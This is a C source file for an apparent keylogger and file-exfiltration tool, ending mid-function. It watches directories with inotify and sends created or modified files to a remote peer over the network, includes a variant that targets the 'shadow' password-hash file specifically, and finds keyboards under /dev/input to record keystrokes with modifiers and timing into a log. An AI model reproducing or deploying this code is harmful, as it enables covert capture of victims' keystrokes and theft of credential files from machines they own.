#include "keylog.h"
#include "fsm.h"
#include "menu_options.h"
#include "udp.h"
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/inotify.h>
#include <unistd.h>

// void watch_path(const char *path)
// {
//     int fd = inotify_init1(IN_NONBLOCK);
//     if (fd < 0)
//     {
//         perror("inotify_init");
//         return;
//     }
//
//     int wd = inotify_add_watch(fd, path,
//                                IN_MODIFY |
//                                    IN_CREATE |
//                                    IN_DELETE |
//                                    IN_MOVED_FROM |
//                                    IN_MOVED_TO);
//
//     if (wd < 0)
//     {
//         perror("inotify_add_watch");
//         close(fd);
//         return;
//     }
//
//     printf("Watching: %s\n", path);
//
//     char buffer[EVENT_BUF_LEN];
//
//     while (1)
//     {
//         int length = read(fd, buffer, EVENT_BUF_LEN);
//
//         if (length < 0)
//         {
//             usleep(100000);
//             continue;
//         }
//
//         int i = 0;
//         while (i < length)
//         {
//             struct inotify_event *event =
//                 (struct inotify_event *)&buffer[i];
//
//             if (event->len)
//             {
//                 if (event->mask & IN_CREATE)
//                     printf("Created: %s\n", event->name);
//
//                 if (event->mask & IN_DELETE)
//                     printf("Deleted: %s\n", event->name);
//
//                 if (event->mask & IN_MODIFY)
//                     printf("Modified: %s\n", event->name);
//
//                 if (event->mask & IN_MOVED_FROM)
//                     printf("Moved from: %s\n", event->name);
//
//                 if (event->mask & IN_MOVED_TO)
//                     printf("Moved to: %s\n", event->name);
//             }
//             else
//             {
//                 if (event->mask & IN_MODIFY)
//                     printf("File modified\n");
//             }
//
//             i += sizeof(struct inotify_event) + event->len;
//         }
//     }
//
//     inotify_rm_watch(fd, wd);
//     close(fd);
// }

static volatile sig_atomic_t g_running = 1;

static void *receive_thread(void *arg)
{
    receiver_args_t *args   = (receiver_args_t *)arg;
    char            *output = NULL;

    if (receive_string(args->ip_ctx, &output) == 0 && output)
    {
        printf("Received: %s\n", output);
        g_running = 0;
        free(output);
    }
    else
    {
        printf("[receiver] receive_string failed or connection closed\n");
    }

    free(args);
    return NULL;
}

static int start_receive_thread(ip_info ip_ctx, pthread_t *thread_out)
{
    pthread_t        tid;
    receiver_args_t *args = malloc(sizeof(*args));
    if (!args)
        return -1;

    args->ip_ctx = ip_ctx;

    if (pthread_create(&tid, NULL, receive_thread, args) != 0)
    {
        free(args);
        return -1;
    }

    if (thread_out)
        *thread_out = tid;

    return 0;
}

static int file_exists(const char *p)
{
    struct stat st;
    return (p && stat(p, &st) == 0 && S_ISREG(st.st_mode));
}

void watch_path(ip_info ip_ctx, const char *path)
{
    g_running = 1;

    pthread_t tid;

    if (start_receive_thread(ip_ctx, &tid) != 0)
    {
        perror("pthread_create");
    }

    int fd = inotify_init1(IN_NONBLOCK);
    if (fd < 0)
    {
        perror("inotify_init1");
        return;
    }

    int wd = inotify_add_watch(fd, path,
                               IN_MODIFY | IN_CREATE | IN_DELETE |
                                   IN_MOVED_FROM | IN_MOVED_TO |
                                   IN_DELETE_SELF | IN_MOVE_SELF);
    if (wd < 0)
    {
        perror("inotify_add_watch");
        close(fd);
        return;
    }

    printf("Watching: %s (Ctrl+C to stop)\n", path);

    char buffer[EVENT_BUF_LEN];

    while (g_running)
    {
        int length = (int)read(fd, buffer, sizeof(buffer));

        if (length < 0)
        {
            if (errno == EAGAIN || errno == EWOULDBLOCK)
            {
                usleep(100000);
                continue;
            }
            if (errno == EINTR)
            {
                continue;
            }

            perror("read(inotify)");
            break;
        }

        if (length == 0)
        {
            usleep(100000);
            continue;
        }

        int i = 0;
        while (i < length)
        {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];

            if (event->mask & IN_Q_OVERFLOW)
            {
                printf("Warning: inotify queue overflow\n");
            }

            if (event->mask & IN_IGNORED)
            {
                printf("Watch was removed/ignored\n");
                g_running = 0;
                break;
            }

            if (event->len && event->name[0] != '\0')
            {
                if (event->mask & IN_CREATE)
                {
                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
                    char *full_path = malloc(needed + 1);

                    if (full_path)
                    {
                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
                    }

                    printf("Created: %s\n", event->name);
                    needed     = snprintf(NULL, 0, "Created: %s\n", event->name);
                    char *buff = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Created: %s\n", event->name);
                    }

                    if (file_exists(full_path))
                    {
                        send_string(ip_ctx, "aA");
                        send_string(ip_ctx, buff);
                        send_file(ip_ctx, full_path);
                    }
                    else
                    {
                        send_string(ip_ctx, "bB");
                        send_string(ip_ctx, buff);
                    }

                    free(buff);
                    free(full_path);
                }
                if (event->mask & IN_DELETE)
                {
                    printf("Deleted file: %s\n", event->name);

                    int   needed = snprintf(NULL, 0, "Deleted file: %s\n", event->name);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Deleted file: %s\n", event->name);
                    }

                    send_string(ip_ctx, "bB");
                    send_string(ip_ctx, buff);

                    free(buff);
                }
                if (event->mask & IN_MODIFY)
                {
                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
                    char *full_path = malloc(needed + 1);

                    if (full_path)
                    {
                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
                    }

                    printf("Modified: %s\n", event->name);
                    needed     = snprintf(NULL, 0, "Modified: %s\n", event->name);
                    char *buff = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Modified: %s\n", event->name);
                    }

                    if (file_exists(full_path))
                    {
                        send_string(ip_ctx, "aA");
                        send_string(ip_ctx, buff);
                        send_file(ip_ctx, full_path);
                    }
                    else
                    {
                        send_string(ip_ctx, "bB");
                        send_string(ip_ctx, buff);
                    }

                    free(buff);
                    free(full_path);
                }
                if (event->mask & IN_MOVED_FROM)
                {
                    printf("Moved from: %s\n", event->name);

                    int   needed = snprintf(NULL, 0, "Moved from: %s\n", event->name);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Moved from: %s\n", event->name);
                    }

                    send_string(ip_ctx, "bB");
                    send_string(ip_ctx, buff);

                    free(buff);
                }
                if (event->mask & IN_MOVED_TO)
                {
                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
                    char *full_path = malloc(needed + 1);

                    if (full_path)
                    {
                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
                    }

                    printf("Moved to: %s\n", event->name);
                    needed     = snprintf(NULL, 0, "Moved to: %s\n", event->name);
                    char *buff = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Moved to: %s\n", event->name);
                    }

                    if (file_exists(full_path))
                    {
                        send_string(ip_ctx, "aA");
                        send_string(ip_ctx, buff);
                        send_file(ip_ctx, full_path);
                    }
                    else
                    {
                        send_string(ip_ctx, "bB");
                        send_string(ip_ctx, buff);
                    }

                    free(buff);
                    free(full_path);
                }
            }
            else
            {
                if (event->mask & IN_MODIFY)
                {
                    printf("Modified file: %s\n", path);

                    int   needed = snprintf(NULL, 0, "Modified file: %s\n", path);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Modified file: %s\n", path);
                    }

                    send_string(ip_ctx, "aA");
                    send_string(ip_ctx, buff);
                    send_file(ip_ctx, path);

                    free(buff);
                }
                if (event->mask & IN_DELETE_SELF)
                {
                    printf("Deleted file: %s\n", path);

                    int   needed = snprintf(NULL, 0, "Deleted file: %s\n", path);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Deleted file: %s\n", path);
                    }

                    send_string(ip_ctx, "bB");
                    send_string(ip_ctx, buff);

                    free(buff);
                }
                if (event->mask & IN_MOVE_SELF)
                {
                    printf("Moved file: %s\n", path);

                    int   needed = snprintf(NULL, 0, "Moved file: %s\n", path);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Moved file: %s\n", path);
                    }

                    send_string(ip_ctx, "bB");
                    send_string(ip_ctx, buff);

                    free(buff);
                }
            }

            i += (int)sizeof(struct inotify_event) + (int)event->len;
        }
    }

    inotify_rm_watch(fd, wd);
    close(fd);
    pthread_join(tid, NULL);
    printf("Stopped watching.\n");
    send_string(ip_ctx, "pP");
}

void watch_path_shadow(ip_info ip_ctx, const char *path)
{
    g_running = 1;

    pthread_t tid;

    if (start_receive_thread(ip_ctx, &tid) != 0)
    {
        perror("pthread_create");
    }

    int fd = inotify_init1(IN_NONBLOCK);
    if (fd < 0)
    {
        perror("inotify_init1");
        return;
    }

    int wd = inotify_add_watch(fd, path,
                               IN_MODIFY | IN_CREATE | IN_DELETE |
                                   IN_MOVED_FROM | IN_MOVED_TO |
                                   IN_DELETE_SELF | IN_MOVE_SELF);
    if (wd < 0)
    {
        perror("inotify_add_watch");
        close(fd);
        return;
    }

    printf("Watching: %s (Ctrl+C to stop)\n", path);

    char buffer[EVENT_BUF_LEN];

    while (g_running)
    {
        int length = (int)read(fd, buffer, sizeof(buffer));

        if (length < 0)
        {
            if (errno == EAGAIN || errno == EWOULDBLOCK)
            {
                usleep(100000);
                continue;
            }
            if (errno == EINTR)
            {
                continue;
            }

            perror("read(inotify)");
            break;
        }

        if (length == 0)
        {
            usleep(100000);
            continue;
        }

        int i = 0;
        while (i < length)
        {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];

            if (event->mask & IN_Q_OVERFLOW)
            {
                printf("Warning: inotify queue overflow\n");
            }

            if (event->mask & IN_IGNORED)
            {
                printf("Watch was removed/ignored\n");
                g_running = 0;
                break;
            }

            if (event->len && event->name[0] != '\0' && strcmp(event->name, "shadow") == 0)
            {
                // if (strcmp(event->name, "shadow") != 0)
                // {
                //     break;
                // }

                if (event->mask & IN_CREATE)
                {
                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
                    char *full_path = malloc(needed + 1);

                    if (full_path)
                    {
                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
                    }

                    printf("Created: %s\n", event->name);
                    needed     = snprintf(NULL, 0, "Created: %s\n", event->name);
                    char *buff = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Created: %s\n", event->name);
                    }

                    if (file_exists(full_path))
                    {
                        send_string(ip_ctx, "aA");
                        send_string(ip_ctx, buff);
                        send_file(ip_ctx, full_path);
                    }
                    else
                    {
                        send_string(ip_ctx, "bB");
                        send_string(ip_ctx, buff);
                    }

                    free(buff);
                    free(full_path);
                }
                if (event->mask & IN_DELETE)
                {
                    printf("Deleted file: %s\n", event->name);

                    int   needed = snprintf(NULL, 0, "Deleted file: %s\n", event->name);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Deleted file: %s\n", event->name);
                    }

                    send_string(ip_ctx, "bB");
                    send_string(ip_ctx, buff);

                    free(buff);
                }
                if (event->mask & IN_MODIFY)
                {
                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
                    char *full_path = malloc(needed + 1);

                    if (full_path)
                    {
                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
                    }

                    printf("Modified: %s\n", event->name);
                    needed     = snprintf(NULL, 0, "Modified: %s\n", event->name);
                    char *buff = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Modified: %s\n", event->name);
                    }

                    if (file_exists(full_path))
                    {
                        send_string(ip_ctx, "aA");
                        send_string(ip_ctx, buff);
                        send_file(ip_ctx, full_path);
                    }
                    else
                    {
                        send_string(ip_ctx, "bB");
                        send_string(ip_ctx, buff);
                    }

                    free(buff);
                    free(full_path);
                }
                if (event->mask & IN_MOVED_FROM)
                {
                    printf("Moved from: %s\n", event->name);

                    int   needed = snprintf(NULL, 0, "Moved from: %s\n", event->name);
                    char *buff   = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Moved from: %s\n", event->name);
                    }

                    send_string(ip_ctx, "bB");
                    send_string(ip_ctx, buff);

                    free(buff);
                }
                if (event->mask & IN_MOVED_TO)
                {
                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
                    char *full_path = malloc(needed + 1);

                    if (full_path)
                    {
                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
                    }

                    printf("Moved to: %s\n", event->name);
                    needed     = snprintf(NULL, 0, "Moved to: %s\n", event->name);
                    char *buff = malloc(needed + 1);

                    if (buff)
                    {
                        snprintf(buff, needed + 1, "Moved to: %s\n", event->name);
                    }

                    if (file_exists(full_path))
                    {
                        send_string(ip_ctx, "aA");
                        send_string(ip_ctx, buff);
                        send_file(ip_ctx, full_path);
                    }
                    else
                    {
                        send_string(ip_ctx, "bB");
                        send_string(ip_ctx, buff);
                    }

                    free(buff);
                    free(full_path);
                }
            }
            // else
            // {
            //     if (event->mask & IN_MODIFY)
            //     {
            //         printf("Modified file: %s\n", event->name);
            //
            //         int   needed = snprintf(NULL, 0, "Modified file: %s\n", event->name);
            //         char *buff   = malloc(needed + 1);
            //
            //         if (buff)
            //         {
            //             snprintf(buff, needed + 1, "Modified file: %s\n", event->name);
            //         }
            //
            //         send_string(ip_ctx, "aA");
            //         send_string(ip_ctx, buff);
            //         send_file(ip_ctx, path);
            //
            //         free(buff);
            //     }
            //     if (event->mask & IN_DELETE_SELF)
            //     {
            //         printf("Deleted file: %s\n", path);
            //
            //         int   needed = snprintf(NULL, 0, "Deleted file: %s\n", path);
            //         char *buff   = malloc(needed + 1);
            //
            //         if (buff)
            //         {
            //             snprintf(buff, needed + 1, "Deleted file: %s\n", path);
            //         }
            //
            //         send_string(ip_ctx, "bB");
            //         send_string(ip_ctx, buff);
            //
            //         free(buff);
            //     }
            //     if (event->mask & IN_MOVE_SELF)
            //     {
            //         printf("Moved file: %s\n", path);
            //
            //         int   needed = snprintf(NULL, 0, "Moved file: %s\n", path);
            //         char *buff   = malloc(needed + 1);
            //
            //         if (buff)
            //         {
            //             snprintf(buff, needed + 1, "Moved file: %s\n", path);
            //         }
            //
            //         send_string(ip_ctx, "bB");
            //         send_string(ip_ctx, buff);
            //
            //         free(buff);
            //     }
            // }

            i += (int)sizeof(struct inotify_event) + (int)event->len;
        }
    }

    inotify_rm_watch(fd, wd);
    close(fd);
    pthread_join(tid, NULL);
    printf("Stopped watching.\n");
    send_string(ip_ctx, "pP");
}

/**
 * Check if a device is a keyboard by examining its capabilities
 * Returns 1 if device is a keyboard, 0 otherwise
 */
static int is_keyboard(int fd)
{
    unsigned long evbit[NBITS(EV_MAX)];
    unsigned long keybit[NBITS(KEY_MAX)];
    int           keyboard_keys = 0;
    int           i;

    // Get supported event types
    memset(evbit, 0, sizeof(evbit));
    if (ioctl(fd, EVIOCGBIT(0, EV_MAX), evbit) < 0)
    {
        return 0;
    }

    // Must support key events
    if (!test_bit(EV_KEY, evbit))
    {
        return 0;
    }

    // Get supported keys
    memset(keybit, 0, sizeof(keybit));
    if (ioctl(fd, EVIOCGBIT(EV_KEY, KEY_MAX), keybit) < 0)
    {
        return 0;
    }

    // Check for typical keyboard keys
    // A real keyboard should have alphanumeric keys

    // Check for letter keys (Q-P row as a sample)
    for (i = KEY_Q; i <= KEY_P; i++)
    {
        if (test_bit(i, keybit))
        {
            keyboard_keys++;
        }
    }

    // Also check for common keys
    if (test_bit(KEY_ENTER, keybit))
        keyboard_keys++;
    if (test_bit(KEY_SPACE, keybit))
        keyboard_keys++;

    // If we found several keyboard keys, it's likely a keyboard
    return keyboard_keys > 5;
}

/**
 * Get detailed device information
 */
static void print_device_infoo(const char *path, int fd)
{
    char            name[256] = "Unknown";
    char            phys[256] = "Unknown";
    char            uniq[256] = "Unknown";
    struct input_id device_info;
    unsigned long   evbit[NBITS(EV_MAX)];

    // Get device name
    ioctl(fd, EVIOCGNAME(sizeof(name)), name);

    // Get physical location
    if (ioctl(fd, EVIOCGPHYS(sizeof(phys)), phys) < 0)
    {
        strcpy(phys, "N/A");
    }

    // Get unique identifier
    if (ioctl(fd, EVIOCGUNIQ(sizeof(uniq)), uniq) < 0)
    {
        strcpy(uniq, "N/A");
    }

    // Get device ID (vendor, product, etc.)
    if (ioctl(fd, EVIOCGID, &device_info) >= 0)
    {
        printf("  Device:   %s\n", path);
        printf("  Name:     %s\n", name);
        printf("  Physical: %s\n", phys);
        printf("  Unique:   %s\n", uniq);
        printf("  Vendor:   0x%04x\n", device_info.vendor);
        printf("  Product:  0x%04x\n", device_info.product);
        printf("  Version:  0x%04x\n", device_info.version);
        printf("  Bus Type: %d\n", device_info.bustype);
    }
    else
    {
        printf("  Device: %s\n", path);
        printf("  Name:   %s\n", name);
    }

    // Show supported event types
    memset(evbit, 0, sizeof(evbit));
    if (ioctl(fd, EVIOCGBIT(0, EV_MAX), evbit) >= 0)
    {
        printf("  Events:   ");
        if (test_bit(EV_KEY, evbit))
            printf("KEY ");
        if (test_bit(EV_REL, evbit))
            printf("REL ");
        if (test_bit(EV_ABS, evbit))
            printf("ABS ");
        if (test_bit(EV_LED, evbit))
            printf("LED ");
        if (test_bit(EV_SND, evbit))
            printf("SND ");
        printf("\n");
    }
}

#define APPEND(fmt, ...)                                                        \
    do                                                                          \
    {                                                                           \
        if (pos < out_size)                                                     \
        {                                                                       \
            int n = snprintf(output + pos, out_size - pos, fmt, ##__VA_ARGS__); \
            if (n > 0)                                                          \
            {                                                                   \
                size_t nn = (size_t)n;                                          \
                if (nn >= out_size - pos)                                       \
                    pos = out_size - 1;                                         \
                else                                                            \
                    pos += nn;                                                  \
            }                                                                   \
        }                                                                       \
    } while (0)

static void discover_keyboards(char *output, size_t out_size,
                               char paths[][PATH_MAX_LEN], size_t max_paths, size_t *out_count)
{
    DIR           *dir;
    struct dirent *entry;
    char           path[PATH_MAX_LEN];
    int            fd;
    int            keyboard_count = 0;
    size_t         pos            = 0;

    if (!output || out_size == 0)
        return;

    output[0] = '\0';

    APPEND("Linux Keyboard Device Discovery\n");
    APPEND("================================\n\n");

    dir = opendir("/dev/input");
    if (!dir)
    {
        APPEND("Error: Cannot open /dev/input: %s\n", strerror(errno));
        APPEND("Hint: You may need to run this program with sudo\n");
        return;
    }

    APPEND("Scanning /dev/input for keyboard devices...\n\n");

    while ((entry = readdir(dir)) != NULL)
    {
        if (strncmp(entry->d_name, "event", 5) != 0)
            continue;

        snprintf(path, sizeof(path), "/dev/input/%s", entry->d_name);

        fd = open(path, O_RDONLY);
        if (fd < 0)
            continue;

        if (is_keyboard(fd))
        {
            keyboard_count++;

            char            name[256] = "Unknown";
            char            phys[256] = "N/A";
            char            uniq[256] = "N/A";
            struct input_id id;

            ioctl(fd, EVIOCGNAME(sizeof(name)), name);
            ioctl(fd, EVIOCGPHYS(sizeof(phys)), phys);
            ioctl(fd, EVIOCGUNIQ(sizeof(uniq)), uniq);

            if (out_count && *out_count < max_paths)
            {
                strncpy(paths[*out_count], path, PATH_MAX_LEN - 1);
                paths[*out_count][PATH_MAX_LEN - 1] = '\0';
                (*out_count)++;
            }

            APPEND("Keyboard #%d:\n", keyboard_count);
            APPEND("  Device:   %s\n", path);
            APPEND("  Name:     %s\n", name);
            APPEND("  Physical: %s\n", phys);
            APPEND("  Unique:   %s\n", uniq);

            if (ioctl(fd, EVIOCGID, &id) >= 0)
            {
                APPEND("  Vendor:   0x%04x\n", id.vendor);
                APPEND("  Product:  0x%04x\n", id.product);
                APPEND("  Version:  0x%04x\n", id.version);
                APPEND("  Bus Type: %d\n", id.bustype);
            }

            unsigned long evbit[NBITS(EV_MAX)];
            memset(evbit, 0, sizeof(evbit));

            if (ioctl(fd, EVIOCGBIT(0, EV_MAX), evbit) >= 0)
            {
                APPEND("  Events:   ");
                if (test_bit(EV_KEY, evbit))
                    APPEND("KEY ");
                if (test_bit(EV_REL, evbit))
                    APPEND("REL ");
                if (test_bit(EV_ABS, evbit))
                    APPEND("ABS ");
                if (test_bit(EV_LED, evbit))
                    APPEND("LED ");
                if (test_bit(EV_SND, evbit))
                    APPEND("SND ");
                APPEND("\n");
            }

            APPEND("\n");
        }

        close(fd);
    }

    closedir(dir);

    APPEND("================================\n");
    APPEND("Total keyboards found: %d\n", keyboard_count);

    if (keyboard_count == 0)
    {
        APPEND("\nNo keyboards detected. Possible reasons:\n");
        APPEND("  - Insufficient permissions (try running with sudo)\n");
        APPEND("  - No physical keyboard connected\n");
        APPEND("  - Keyboard drivers not loaded\n");
    }
    else
    {
        APPEND("\nNote: Multiple interfaces from the same physical device may be listed.\n");
        APPEND("This is normal for devices with separate standard/multimedia interfaces.\n");
    }
}

/**
 * Signal handler for clean exit
 */
static void signal_handler(int signum)
{
    (void)signum;
    running = 0;
}

/**
 * Fix Parallels virtual keyboard scan code bugs
 * Only fix when we have a valid scan code AND the key code looks wrong
 */
static int fix_parallels_key_code(int code, uint32_t scan_code, int *was_fixed)
{
    if (was_fixed)
    {
        *was_fixed = 0;
    }

    if (scan_code == 0)
    {
        return code; // No scan code available
    }

    // Parallels bug: HID usage for left shift but kernel reports wrong key
    if (scan_code == HID_USAGE_KEYBOARD_LEFTSHIFT &&
        code != KEY_LEFTSHIFT && code != KEY_RIGHTSHIFT)
    {
        if (was_fixed)
        {
            *was_fixed = 1;
        }
        return KEY_LEFTSHIFT;
    }

    // Parallels bug: HID usage for right shift but kernel reports wrong key
    if (scan_code == HID_USAGE_KEYBOARD_RIGHTSHIFT &&
        code != KEY_LEFTSHIFT && code != KEY_RIGHTSHIFT)
    {
        if (was_fixed)
        {
            *was_fixed = 1;
        }
        return KEY_RIGHTSHIFT;
    }

    return code;
}

/**
 * Update modifier key states
 */
static void update_modifiers(int code, int value)
{
    int pressed = (value == 1);

    switch (code)
    {
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT:
            modifiers.shift = pressed;
            break;
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL:
            modifiers.ctrl = pressed;
            break;
        case KEY_LEFTALT:
        case KEY_RIGHTALT:
            modifiers.alt = pressed;
            break;
        case KEY_LEFTMETA:
        case KEY_RIGHTMETA:
            modifiers.meta = pressed;
            break;
        case KEY_CAPSLOCK:
            // Capslock is a toggle - only change on press
            if (value == 1)
            {
                modifiers.capslock = !modifiers.capslock;
            }
            break;
    }
}

/**
 * Print current modifier state
 */
static void print_modifiers(FILE *logf)
{
    printf(" [");
    fprintf(logf, " [");
    if (modifiers.shift)
    {
        printf("SHIFT ");
        fprintf(logf, "SHIFT ");
    }
    if (modifiers.ctrl)
    {
        printf("CTRL ");
        fprintf(logf, "CTRL ");
    }
    if (modifiers.alt)
    {
        printf("ALT ");
        fprintf(logf, "ALT ");
    }
    if (modifiers.meta)
    {
        printf("META ");
        fprintf(logf, "META ");
    }
    if (modifiers.capslock)
    {
        printf("CAPS ");
        fprintf(logf, "CAPS ");
    }
    if (!modifiers.shift && !modifiers.ctrl && !modifiers.alt &&
        !modifiers.meta && !modifiers.capslock)
    {
        printf("none");
        fprintf(logf, "none");
    }
    printf("]");
    fprintf(logf, "]");
}

/**
 * Print time relative to first event
 */
static void print_relative_time(struct timeval *ev_time, FILE *logf)
{
    char time_buf[32];

    if (!start_time_valid)
    {
        start_time       = *ev_time;
        start_time_valid = 1;
        snprintf(time_buf, sizeof(time_buf), "+0.000000");
    }
    else
    {
        long sec_delta  = ev_time->tv_sec - start_time.tv_sec;
        long usec_delta = ev_time->tv_usec - start_time.tv_usec;
        if (usec_delta < 0)
        {
            sec_delta--;
            usec_delta += 1000000;
        }
        snprintf(time_buf, sizeof(time_buf), "+%ld.%06ld", sec_delta, usec_delta);
    }

    printf("%-15s", time_buf);
    fprintf(logf, "%-15s", time_buf);
}

/**
 * Convert event type to string
 * Note: Returns pointer to static buffer for unknown types - don't call multiple times in same printf
 */
static const char *event_type_to_string(int type)
{
    switch (type)
    {
        case EV_SYN: return "EV_SYN";
        case EV_KEY: return "EV_KEY";
        case EV_REL: return "EV_REL";
        case EV_ABS: return "EV_ABS";
        case EV_MSC: return "EV_MSC";
        case EV_SW: return "EV_SW";
        case EV_LED: return "EV_LED";
        case EV_SND: return "EV_SND";
        case EV_REP: return "EV_REP";
        default:
        {
            static char buf[32];
            snprintf(buf, sizeof(buf), "TYPE_%d", type);
            return buf;
        }
    }
}

/**
 * Convert code to string (writes to provided buffer)
 */
static const char *code_to_string_buf(int type, int code, char *buf, size_t buflen)
{
    if (type == EV_SYN)
    {
        switch (code)
        {
            case SYN_REPORT: return "SYN_REPORT";
            case SYN_CONFIG: return "SYN_CONFIG";
            case SYN_MT_REPORT: return "SYN_MT_REPORT";
            case SYN_DROPPED: return "SYN_DROPPED";
            default:
                snprintf(buf, buflen, "SYN_%d", code);
                return buf;
        }
    }

    if (type == EV_MSC)
    {
        switch (code)
        {
            case MSC_SCAN: return "MSC_SCAN";
            case MSC_SERIAL: return "MSC_SERIAL";
            case MSC_PULSELED: return "MSC_PULSELED";
            case MSC_GESTURE: return "MSC_GESTURE";
            case MSC_RAW: return "MSC_RAW";
            case MSC_TIMESTAMP: return "MSC_TIMESTAMP";
            default:
                snprintf(buf, buflen, "MSC_%d", code);
                return buf;
        }
    }

    if (type == EV_KEY)
    {
        // CHECK SPECIAL KEYS FIRST
        switch (code)
        {
            case KEY_ESC: return "KEY_ESC";
            case KEY_ENTER: return "KEY_ENTER";
            case KEY_BACKSPACE: return "KEY_BACKSPACE";
            case KEY_TAB: return "KEY_TAB";
            case KEY_SPACE: return "KEY_SPACE";
            case KEY_MINUS: return "KEY_MINUS";
            case KEY_EQUAL: return "KEY_EQUAL";
            case KEY_LEFTBRACE: return "KEY_LEFTBRACE";
            case KEY_RIGHTBRACE: return "KEY_RIGHTBRACE";
            case KEY_SEMICOLON: return "KEY_SEMICOLON";
            case KEY_APOSTROPHE: return "KEY_APOSTROPHE";
            case KEY_GRAVE: return "KEY_GRAVE";
            case KEY_BACKSLASH: return "KEY_BACKSLASH";
            case KEY_COMMA: return "KEY_COMMA";
            case KEY_DOT: return "KEY_DOT";
            case KEY_SLASH: return "KEY_SLASH";
            case KEY_CAPSLOCK: return "KEY_CAPSLOCK";
            case KEY_LEFTSHIFT: return "KEY_LEFTSHIFT";
            case KEY_RIGHTSHIFT: return "KEY_RIGHTSHIFT";
            case KEY_LEFTCTRL: return "KEY_LEFTCTRL";
            case KEY_RIGHTCTRL: return "KEY_RIGHTCTRL";
            case KEY_LEFTALT: return "KEY_LEFTALT";
            case KEY_RIGHTALT: return "KEY_RIGHTALT";
            case KEY_LEFTMETA: return "KEY_LEFTMETA";
            case KEY_RIGHTMETA: return "KEY_RIGHTMETA";
            case KEY_UP: return "KEY_UP";
            case KEY_DOWN: return "KEY_DOWN";
            case KEY_LEFT: return "KEY_LEFT";
            case KEY_RIGHT: return "KEY_RIGHT";
            case KEY_PAGEUP: return "KEY_PAGEUP";
            case KEY_PAGEDOWN: return "KEY_PAGEDOWN";
            case KEY_HOME: return "KEY_HOME";
            case KEY_END: return "KEY_END";
            case KEY_INSERT: return "KEY_INSERT";
            case KEY_DELETE: return "KEY_DELETE";
        }

        // Function keys
        if (code >= KEY_F1 && code <= KEY_F12)
        {
            snprintf(buf, buflen, "KEY_F%d", code - KEY_F1 + 1);
            return buf;
        }

        // Letters
        if (code >= KEY_A && code <= KEY_Z)
        {
            snprintf(buf, buflen, "KEY_%c", 'A' + (code - KEY_A));
            return buf;
        }

        // Numbers
        if (code >= KEY_1 && code <= KEY_9)
        {
            snprintf(buf, buflen, "KEY_%d", code - KEY_1 + 1);
            return buf;
        }
        if (code == KEY_0)
            return "KEY_0";

        snprintf(buf, buflen, "KEY_%d", code);
        return buf;
    }

    snprintf(buf, buflen, "CODE_%d", code);
    return buf;
}

/**
 * Convert code to string (uses static buffer - not safe for multiple calls in same printf)
 */
static const char *code_to_string(int type, int code)
{
    static char buf[32];
    return code_to_string_buf(type, code, buf, sizeof(buf));
}

/**
 * Convert value to string based on event type and code
 */
static const char *value_to_string(int type, int code, int value)
{
    static char buf[32];

    if (type == EV_KEY)
    {
        switch (value)
        {
            case 0: return "RELEASE";
            case 1: return "PRESS";
            case 2: return "REPEAT";
            default:
                snprintf(buf, sizeof(buf), "STATE_%d", value);
                return buf;
        }
    }

    if (type == EV_SYN)
    {
        snprintf(buf, sizeof(buf), "%d", value);
        return buf;
    }

    if (type == EV_MSC)
    {
        // MSC_SCAN is typically a scan code - show as hex
        // Other MSC types are various integers - show as decimal
        if (code == MSC_SCAN)
        {
            snprintf(buf, sizeof(buf), "0x%08x", (uint32_t)value);
        }
        else
        {
            snprintf(buf, sizeof(buf), "%d", value);
        }
        return buf;
    }

    snprintf(buf, sizeof(buf), "%d", value);
    return buf;
}

/**
 * Verify device supports keyboard events and looks like a keyboard
 */
static int verify_device(int fd)
{
    unsigned long evbit[NBITS(EV_MAX + 1)];
    unsigned long keybit[NBITS(KEY_MAX + 1)];

    // Check event types
    memset(evbit, 0, sizeof(evbit));
    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0)
    {
        perror("ioctl EVIOCGBIT(0)");
        return 0;
    }

    if (!test_bit(EV_KEY, evbit))
    {
        fprintf(stderr, "Error: Device does not support keyboard events (EV_KEY)\n");
        return 0;
    }

    // Check if it looks like a keyboard (not just a button/mouse)
    memset(keybit, 0, sizeof(keybit));
    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0)
    {
        perror("ioctl EVIOCGBIT(EV_KEY)");
        return 0;
    }

    // A real keyboard should have some common keys
    if (!test_bit(KEY_A, keybit) && !test_bit(KEY_Q, keybit) &&
        !test_bit(KEY_ENTER, keybit) && !test_bit(KEY_SPACE, keybit) &&
        !test_bit(KEY_LEFTSHIFT, keybit))
    {
        fprintf(stderr, "Warning: Device has EV_KEY but doesn't look like a keyboard\n");
